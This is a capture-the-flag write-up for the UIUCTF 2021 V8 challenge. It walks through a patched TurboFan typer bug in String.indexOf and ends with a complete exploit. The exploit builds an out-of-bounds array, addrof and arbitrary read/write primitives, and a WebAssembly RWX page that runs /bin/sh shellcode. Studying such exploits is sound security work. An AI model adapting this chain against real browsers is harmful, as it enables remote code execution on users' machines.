# uiuctf2021 - should've had a v8

This challenge is obviously (you can tell by it's name) is a v8 exploitation challenge, I could not finish it during the ctf since I wasn't good enough and I'm still learning about browser exploitation, I decided to write the writeup in order to teach and better understand how v8 exploits work in-depth.

At first the players were given a binary with patch files and a readme.

the readme contained the actual important parts of the patch.

let's take a quick look at the patch file:

```diff
diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
index 899922a27f..aea23fe7ea 100644
--- a/src/compiler/js-create-lowering.cc
+++ b/src/compiler/js-create-lowering.cc
@@ -681,7 +681,7 @@ Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) {
       int capacity = static_cast<int>(length_type.Max());
       // Replace length with a constant in order to protect against a potential
       // typer bug leading to length > capacity.
-      length = jsgraph()->Constant(capacity);
+      //length = jsgraph()->Constant(capacity);
       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
                             allocation, slack_tracking_prediction);
     }
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 0f18222236..0f76ad896e 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -2073,7 +2073,7 @@ Type Typer::Visitor::TypeStringFromCodePointAt(Node* node) {
 }

 Type Typer::Visitor::TypeStringIndexOf(Node* node) {
-  return Type::Range(-1.0, String::kMaxLength, zone());
+  return Type::Range(0, String::kMaxLength, zone());
 }

 Type Typer::Visitor::TypeStringLength(Node* node) {
```

We can see there are two changes that matter to us:

1. length is no longer constant and the same as capacity, we can see via the comment what the constraint tries to accomplish.

   ```c++
   int capacity = static_cast<int>(length_type.Max());
          // Replace length with a constant in order to protect against a potential
          // typer bug leading to length > capacity. --> this is the part of the comment that is important.
          length = jsgraph()->Constant(capacity);
          //length = jsgraph()->Constant(capacity);
          return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
                                allocation, slack_tracking_prediction);
        }
   ```

   

2. The Typer range of the function `TypeStringIndexOf` is changed from `(-1, String::kMaxLength)` to `(0, String::kMaxLength)`.

   ```c++
   return Type::Range(0, String::kMaxLength, zone());
   ```



Now that we know what are the changes let's try to understand their implications and what they actually changed.



### The `TypeStringIndexOf` patch

We can quickly realize either by googling and looking the up `TypeStringIndexOf` or by guessing it's the `indexOf` of the string object, 

the patched function also referenced the String for the upper bound of the result ranges.



Now let's try to understand what is the [Typer](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#typer-phase) and what role does the patch play here.

In the link above there is a better explanation but in our context, the typer knows which types each builtin functions and use it to reduce checks in the jitted code.

One more short explanation can be found [here](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/).

The meaning of this for us, is that the function can still return in the range of `(-1, string::kMaxLength)` but the jitted code will not expect the case where the returned value is -1, if we read the [indexOf documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/indexOf) we can see that -1 is returned when the given character is not found in the string.

```
The indexOf() method returns the index within the calling String object of the first occurrence of the specified value, starting the search at fromIndex. Returns -1 if the value is not found. 
```

This gave me an initial idea, if we can return -1 using indexOf in a jitted function we can create a new array with the index as the size of the array, this way we can create an array with a length longer than it's capacity and gain OOB rw on the array!



### First bug trigger attempt

let's try it!

```js
function jit(letter){
    let size = "abcdef".indexOf(letter);
    
    let oob = new Array(size);
    
    // We want a floating point array later on.
    oob[0] = 1.1;
    return oob;
}

// This loop will cause the function to get jitted (compiled to native code).
for(let i = 0; i < 400000; i++){
	jit("f");
}

// This will trigger indexOf to return -1 since 'g' is not in the string "abcdef"
oob = jit("g");
```

Well, too bad, it didn't work we get the following error `undefined:76: RangeError: Invalid array length`.

This means there are still checks on the size before passing it to the Array function, let's try to think what the jit compiler is expecting at every moment.

```js
function jit(letter){
    let size = "abcdef".indexOf(letter);
    // Right now the size variable can be anywhere between (0, string::kMaxLength).
    // 0 is still an invalid array size, so the compiler must
    // have added a check to see if there is an invalid size.
    
    let oob = new Array(size);
    
    // We want a floating point array later on.
    oob[0] = 1.1;
    return oob;
}
```

As the comment in the code above says, the value returned from `indexOf` can still be an invalid array size, the typer made sure the compiler knows to expect it as a possible return value, this would mean that right before the array creation there should be a check to see if  `size` is a valid length.

At this point I kind of got stuck during the ctf, I tried to bypass this "check" by cheating the compiler into thinking `size` is a valid array length when in reality it isn't, for example, we can do the following:

```js
function jit(letter){
    let size = "abcdef".indexOf(letter);
    // Right now the size variable can be anywhere between (0, String::kMaxLength).
    
    size = size + 1;
    // After the addition size is expected to be between (1, String::kMaxLength + 1)
    
    let oob = new Array(size);
    
    // We want a floating point array later on.
    oob[0] = 1.1;
    return oob;
}
```

In this case the jit compiler will think size is a valid size even though it's not, and the actual length will be 0 even though the compiler expects it to be at least 1, this isn't really too useful since we can't access the array if the length is 0.



After thinking a bunch (post-ctf) and did not reach a solution I found some people in the uiuctf discord that released their exploit scripts on github,

I used [this one](https://github.com/rpm0618/writeups/blob/master/uiuctf2021/shouldhavehadav8/exploit.js) for example.



let's look at what he did in order to minimize the options for `size`:

```js
function jit(letter) {
    // Actual Range of i: [-1, stringMaxLength]
    // Calculated Range:  [0, stringMaxLength]
    let size = "abcdef".indexOf(letter);

    // Here the shift by 0x1d collapses the calculated range to [0, 0]. Since -1 >> 0x1d == -1, the 
    // actual range keeps the negative intact. This bit is needed as otherwise v8 will use a special
    // constant backing array it uses for empty arrays.
    // Actual Range of i: [-9, 1]
    // Calculated Range:  [1, 1]
    size = (size >> 0x1d) * 10 + 1;

    // Since it is thought the length is known exactly (calculated range is [1, 1]), when this part
    // is optimized the allocation will be inlined. Normally during the lowering the known value
    // would be replaced by a constant node, but the second part of the patch prevents this.
    oob = new Array(size);

    // Coerce type of returned array to HOLEY_DOUBLE_ELEMENTS, so we can read out data as floats
    oob[0] = 1.1;

    return oob;
}
```

 It's very nice since he even commented the code, let's read it step by step:

1. Right after the `indexOf` the range is exactly as we expected (-1, StringMaxLength) while the jit compiler thinks it's (0, StringMaxLength).
2. shifting the size variable right by  0x1d will always reduce the value of size to 0, or at least that's what the compiler will think (stringMaxLength is 2**28 - 1), In our case since the returned value is -1 it won't change at all, so the compiler will think there is only 1 possiblity which is 0.
3. Since we want the compiler to think the value he used is valid we need the assumed `size` value to be larger than 0, but if we just add 1 here actual size will be 0 which still won't help us, since that's the case if we will multiply by pretty much anything above 0 the actual value will be changed while the assumed value wont, let's say we multiply by 2 instead of 10.
4. the actual value is now -2 while the assumed value is 0, if we add 1 now we should be able to create an array with an assumed value length while the actual length will be -1, this will give as an OOB primitive!

let's try it:

```js
function jit(letter){
    
    let idx = "abcdef".indexOf(letter);
	// compiler: [0, stringMaxLength]
    // reality: [-1, stringMaxLength]
    // `idx >> 29` is used to make sure type will assume idx is 0 because strMaxLength is (2**28-16) so right shifting by 29
    // // should make sure it's 0. but in the case of negative values it doesn't happen (which is the actual value), 
    // // this means we made the compiler assume a wrong length!
    idx = (idx >> 29)
	// compiler: [0]
    // reality: [-1]
    // // the `idx * 2` is to make the number larger than -1 
    // // (if it's -1 but we add one later than the actual size will be 0, this will cause a crash)
    // // and the `+ 1` is required to make the typer assume idx is a valid length (greater than 0), since it still thinks it's 0
    // idx = idx * 2 + 1
    idx = idx * 2;
    // compiler: [0]
    // reality: [-2]
    
    idx = idx + 1;
    // compiler: [1]
    // reality: [-1]
    // This will allocate an array with a size of -1 which will allow for OOB access
    let oob = new Array(idx);

    // Make sure the array is a floating point array, just because it will come in handy later
    oob[0] = 1.1;

    // let's return the `oob` array
    return oob;

}
```

This function should now theoretically return a floating point array that will allow for OOB access, with this we can very strong primitives which I will attempt to explain now.



### `addrof` primitive

In a modern browser there are multiple mitigations against exploitation, one of which is ASLR (Address Space Layout Randomization).

This means the addresses will change between every execution of the binary, so we cannot know the addresses ahead of time, so a primitive we would like to get is a way to get the addresses of objects in memory.

A simple way to do this is put an object somewhere in memory and leak it's pointer via our OOB access (I assume we already triggered the bug):

```js
let oob = jit("g");

victim = {obj: {}};
```

using this `victim.obj` we will be able to leak an address of any object we want, the index in the oob array was found in the following way:

```js
let oob = jit("g");

victim = [13.13];
let victim_idx = 0;
for (let i=0; i < 100; i++){
    if(oob[i] == 13.13){
        print(i);
        break;
    }
}
```

This would print the index at which we reached the following object after ours, in this case the offset was 4.

Now that we have the required offset and a plan to leak the address let's write a function to help us with that:

```js
function addrof(to_leak){
    victim.obj = to_leak;
	return ((ftoi(oob[ADDROF_OFFSET]) >> 32n) & 0xffffffffn);
}
```

Now `addrof` should leak the address of any given `to_leak`, I tried to confirm it with gdb at first, but I learned something surprising, the address of all the objects I tried to leak were not mapped.

Later on I realized that in v8 they created something called "compressed pointers", quick explanation about it, only the 32-bit part of the address is actually saved for each object in order to minimize memory consumption, the upper 32-bit part of the address is saved only once somewhere else.

The other two primitives we need to gain are arbitrary read and arbitrary write.

### Arbitrary read/write

We want to be able to read and write from any address in memory, this would be implemented differently for compressed and non-compressed pointers, let's start from compressed pointers.

Say we have a compressed pointer `x` that we want to read from, how can we do it?

well, we said almost all objects in v8 use a compressed pointer instead of a normal pointer this means arrays also use them for the backing store (pointer to the data), this means we can just overwrite the lower 32-bit of the backing store with a different compressed pointer and gain arbitrary read/write from compressed pointers

```js
function read64_compressed(addr){
    // This will be used to save the higher 32-bits of the current backing store
	let current_high = ftoi(float_arr[float_arr_idx]) & 0xffffffff00000000n;
    
    // lower 32-bit of the address we want to read
    let new_lower = addr & 0xffffffffn;
    
    // The new address
    let new_addr = current_high + new_lower;
    
    // Change the `float_arr` backing store to read from it
    oob[float_arr_idx] = itof(new_addr);
    
    // Read from `float_arr`
    return ftoi(float_arr[0]);
}

function write64_compressed(addr, val){
    // This will be used to save the higher 32-bits of the current backing store
	let current_high = ftoi(float_arr[float_arr_idx]) & 0xffffffff00000000n;
    
    // lower 32-bit of the address we want to read
    let new_lower = addr & 0xffffffffn;
    
    // The new address
    let new_addr = current_high + new_lower;
    
    // Change the `float_arr` backing store to read from it
    oob[float_arr_idx] = itof(new_addr);
    
    // write `val` to `float_arr` 
    float_arr[0] = itof(val);
}

let oob = jit("g");

let float_arr = [1.1, 2.2, 3.3];
let float_arr_idx = null;
for(let i = 0; i < 100; i++){
    if (oob[i] == 1.1){
        float_arr_idx = i + 6;
        break
    }
}

read64_compressed(x);
write64_compressed(x, 0x41414141);
```

The code above implements arbitrary read/write for compressed pointer objects.



In order to implement arbitrary read/write for regular non-compressed pointers we can use a different object in js which it's backing store is actually just a pointer on the heap, the object is an `ArrayBuffer`

```js
function write(addr, data){
    // Set the wanted address (valid non-compressed address)
    oob[victim_buf_idx] = itof(addr);
    let u8_buf = new Uint8Array(victim_buf);
    
    // Loop over all bytes in data and write them to given address.
    for (let i = 0; i < data.length; i++) {
        u8_buf[i] = data[i];
    }
}

let oob = jit("g");

let victim_buf = new ArrayBuffer(0x41);
let victim_buf_idx = null;
for(let i = 0; i < 100; i++){
    let val = ftoi(oob[i]).toString(16);
    // 0x41 is the size of `victim_buf`
    if (val === "41"){
        // This can be used to make sure we have reached `victim_buf` and not something else.
        oob[i] = itof(0x10000);
        victim_buf_idx = i + 1;
        break
    }
}

```

In the above code the arbitrary write is implemented (because that's all I needed for the exploit), but it shouldn't be to hard to convert it to an arbitrary read as well.



### Full exploit

Using the primitives we gained we can create a "wasm" region in memory which contains a RWX memory, we can write shellcode to that address and execute the shellcode, I will now paste the full exploit, feel free to dm me on [twitter](https://twitter.com/sysc4lls) for any questions/improvements or anything else!



```js
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);


function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    temp = BigInt(val);
    u64_buf[0] = Number(temp & 0xffffffffn);
    u64_buf[1] = Number(temp >> 32n);
    return f64_buf[0];
}

const ADDROF_OFFSET = 4;


function addrof(target) {
    // Returns the (compressed) address of the target object. Does this by using the oob array to
    // read the obj pointer on the victim object
    victim.obj = target;
    return ((ftoi(oob[ADDROF_OFFSET]) >> 32n) & 0xffffffffn);
}

function read64_from_compressed(addr_compressed) {
    // Since the pointer is compressed we need to make sure we overwrite only the lower 32-bits 
    // of the float_arr backing store pointer.
    // 32bit data | 32bit offset
    let lower32_addr = (addr_compressed) & 0x00000000ffffffffn;
    let current_upper = ftoi(oob[float_arr_idx]) & 0xffffffff00000000n;
    let new_addr = current_upper + lower32_addr;
    oob[float_arr_idx] = itof(new_addr);
    return ftoi(float_arr[0]);
}

function write64(addr, val){
    oob[float_arr_idx] = addr;
    float_arr[0] = val;
}

function write(addr, data){
    print("[+] writing to addr: 0x" + addr.toString(16));

    oob[victim_buf_idx] = itof(addr);
    
    let u8_buf = new Uint8Array(victim_buf);
    for (let i = 0; i < data.length; i++) {
        u8_buf[i] = data[i];
    }
}

function jit(letter){
    
    let idx = "abcdef".indexOf(letter);

    
    // // `idx >> 29` is used to make sure type will assume idx is 0 because strMaxLength is (2**28-16) so right shifting by 29
    // // should make sure it's 0. but in the case of negative values it doesn't happen (which is the actual value), 
    // // this means we made the compiler assume a wrong length!
    idx = (idx >> 29)

    // // the `idx * 2` is to make the number larger than -1 
    // // (if it's -1 but we add one later than the actual size will be 0, this will cause a crash)
    // // and the `+ 1` is required to make the typer assume idx is a valid length (greater than 0), since it still thinks it's 0
    idx = idx * 2;
    idx = idx + 1;
    // This will allocate an array with a size of -1 which will allow for OOB access
    let oob = new Array(idx);

    // Make sure the array is a floating point array, just because it will come in handy later
    oob[0] = 1.1;

    // let's return the `corrupted` array
    return oob;

}

// jit the function
iters = 40000;
for(var i = 0;i < iters; i++){
    jit("f");
}

let oob = jit("g");

// The object property will be replaced with an object we want to get it's addr
// the address will most likely be a compressed address
victim = {obj: {}};

// An `ArrayBuffer` is a very simple way to gain an arbitrary write, 
// it allows to overwrite backingstore + size to gain an arbitrary read/write. 
victim_buf = new ArrayBuffer(0x41);

// This is used for reading from a compresed pointer (for example wasm_instance's pointer).
float_arr = [0.1, 0.2, 0.3, 0.4, 0.5];

// Find index of `victim_buf`'s backing_store
let victim_buf_idx = null;
for (let i = 0; i < 1000; i++) {
    let val = ftoi(oob[i]).toString(16);
    if (val === "41") {
        oob[i] = itof(0x10000);
        victim_buf_idx = i + 1;
        break;
    }
}

// find index of the floating array backing store
float_arr_idx = null;
for (i = 0; i < 100; i++) {
    if (oob[i] == 0.1) {
        float_arr_idx = i+6;
        break;
    }
}

// Create rwx page for shellcode to go (stolen from https://github.com/r4j0x00/exploits/blob/master/chrome-exploit/exploit.js)
const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
const mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(mod);
const shellcode = wasm_instance.exports.shell;

// Get the addrof the wasm object.
wasm_addr = addrof(wasm_instance) - 0x8n;

// Get the memory address of the rwx page from wasm.
rwx = read64_from_compressed(wasm_addr + 0x68n);
print("[+] rwx: 0x" + rwx.toString(16))

// Write shellcode, and run
code = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5];
print("[+] Writing shellcode....");
write(rwx, code);

print("[+] success!");
shellcode();

// END
```

